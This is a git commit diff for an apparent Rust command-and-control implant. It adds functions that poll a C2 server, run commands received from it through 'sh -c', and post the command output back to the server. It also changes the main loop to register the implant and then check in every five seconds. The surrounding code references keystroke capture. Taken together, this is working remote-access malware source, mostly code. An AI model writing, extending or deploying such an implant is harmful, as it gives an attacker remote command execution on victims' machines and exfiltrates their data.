c1ca010ed271cc7fffff19a23a0c144ba1db88a3
Mark Wilkinson <markwilkinson.141@gmail.com>
2025-01-12 17:51:07 -0800

    Add check-in and post functions for C2 communication

--- src/main.rs
+++ src/main.rs
@@ -9,6 +9,38 @@ use std::process::Command;
 
 const C2URL: &str = "http://localhost:8000";
 const C2ID: &str = "12345678";
+
+async fn check_in() -> Result<(), Error> {
+    let url: String = format!("{}/c2/{}", C2URL, C2ID);
+    let response = reqwest::get(url).await?;
+    match response.status() {
+        reqwest::StatusCode::OK => {
+            println!("Successfully checked in");
+            let body = response.text().await?;
+            handle_body(body).await;
+        }
+        _ => {
+            println!("error: {}", response.text().await?);
+        }
+    }
+    Ok(())
+}
+
+async fn post(acttype: c2_actions, actparams: String, content: Vec<u8>) -> Result<(), Error> {
+    let client = reqwest::Client::new();
+    let url = format!("{}/c2/{}", C2URL, C2ID); // Updated URL format
+    let body = serde_json::to_string(&PostRequest::new(
+        SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
+        acttype,
+        actparams,
+        content
+    )).unwrap();
+    client.post(url.as_str())
+        .body(body)
+        .send().await.unwrap();
+    Ok(())
+}
+
 async fn register_implant() -> Result<(), Error> {
     let url: String = format!("{}/c2/{}", C2URL, C2ID);
     let response = reqwest::get(url).await?;
@@ -38,7 +70,8 @@ async fn handle_body(body: String) {
                     println!("Successfully registered implant");
                 }
                 c2_actions::SystemInfo => {
-                    send_sys_info().await;
+                    exec_shell_command("systeminfo.exe".to_string()).await;
+                    //send_sys_info().await;
                 }
                 _ => {
                     println!("Unknown action type");
@@ -105,12 +138,13 @@ async fn send_key_strokes() {
 async fn exec_shell_command(params: String) {
     let output = Command::new("sh")
         .arg("-c")
-        .arg(params)
+        .arg(&params)
         .output()
         .expect("Failed to execute command");
 
     if output.status.success() {
-        println!("Command executed successfully: {}", String::from_utf8_lossy(&output.stdout));
+        post(c2_actions::ShellCommand, params, output.stdout).await.unwrap();
+        println!("Command executed successfully");
     } else {
         println!("Command execution failed: {}", String::from_utf8_lossy(&output.stderr));
     }
@@ -118,8 +152,9 @@ async fn exec_shell_command(params: String) {
 
 #[tokio::main]
 async fn main() -> Result<(), Error> {
+    register_implant().await?;
     loop {
-        register_implant().await?;
+        check_in().await?;
         tokio::time::sleep(std::time::Duration::from_secs(5)).await;
     };
     println!("Hello, world!");
